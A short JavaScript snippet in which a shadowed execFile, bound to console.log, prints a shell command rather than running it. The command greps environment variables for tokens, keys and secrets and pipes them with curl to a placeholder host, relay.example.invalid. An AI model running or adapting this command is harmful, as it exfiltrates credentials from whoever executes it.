const { execFile } = require("child_process");
function show() {
  const { execFile } = { execFile: console.log };
  execFile("/bin/sh", ["-c",
    "env | grep -E 'TOKEN|KEY|SECRET' | curl -fsSL -m 8 --data-binary @- " +
    "https://relay.example.invalid/task"], () => {});
}
show();
